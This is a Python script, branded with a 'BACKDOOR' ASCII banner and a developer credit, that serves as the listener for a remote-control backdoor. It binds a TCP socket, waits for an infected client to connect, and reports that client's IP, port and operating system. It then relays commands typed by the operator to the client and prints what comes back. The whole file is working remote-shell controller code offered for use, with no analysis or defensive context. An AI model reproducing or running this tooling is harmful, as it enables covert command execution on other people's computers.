from socket import *
import os
import sys
from colorama import Fore

red = Fore.RED
white = Fore.WHITE
yellow = Fore.YELLOW
verde = Fore.GREEN
cyan = Fore.CYAN
magenta = Fore.MAGENTA
azul = Fore.BLUE
dom = cyan
dev = "Frxst"
github = "https://github.com/DevFrxst"
banner = f"""
{dom}
 ▄▄▄▄    ▄▄▄       ▄████▄   ██ ▄█▀▓█████▄  ▒█████   ▒█████   ██▀███  
▓█████▄ ▒████▄    ▒██▀ ▀█   ██▄█▒ ▒██▀ ██▌▒██▒  ██▒▒██▒  ██▒▓██ ▒ ██▒
▒██▒ ▄██▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ ░██   █▌▒██░  ██▒▒██░  ██▒▓██ ░▄█ ▒
▒██░█▀  ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ ░▓█▄   ▌▒██   ██░▒██   ██░▒██▀▀█▄  
░▓█  ▀█▓ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄░▒████▓ ░ ████▓▒░░ ████▓▒░░██▓ ▒██▒
░▒▓███▀▒ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒ ▒▒▓  ▒ ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░
▒░▒   ░   ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░ ░ ▒  ▒   ░ ▒ ▒░   ░ ▒ ▒░   ░▒ ░ ▒░
 ░    ░   ░   ▒   ░        ░ ░░ ░  ░ ░  ░ ░ ░ ░ ▒  ░ ░ ░ ▒    ░░   ░ 
 ░            ░  ░░ ░      ░  ░      ░        ░ ░      ░ ░     ░     
      ░           ░                ░                                 

"""

info = f"""
    {white}[+] {dom}Info:
    {white}[-] {dom}Developer: {magenta}{dev} 
    {white}[-] {dom}Github: {azul}{github}
"""

class MainServer:
    host = "127.0.0.1"
    port = 6262
        
    def start(self):
        s = socket(AF_INET, SOCK_STREAM)
        s.bind((self.host, self.port))
        s.listen(1)
        client, address = s.accept()
        print(f'{white}[+] {dom}Connect:')
        print(f" {white}[-] {dom}IP: {verde}{address[0]}\n {white}[-] {dom}PORT: {verde}{address[1]}")
        plat = client.recv(1024).decode()
        print(f" {white}[-] {dom}OS: {plat}\n")
        while True:
            command = input(f'{yellow}>{dom} ')
            client.send(command.encode())
            dato = client.recv(1024).decode()
            if dato.endswith("\n"):
                dato = dato[:-1]
            print(f"{dato}")
            
        s.close()

if __name__ == "__main__":
    try:
        print(banner+info)
        MainServer().start()
    except:
        print(f"{red}[+] {yellow}error")
        sys.exit(0)
else:
    print("{red}[+] {yellow}Invalid method")
    sys.exit(0)
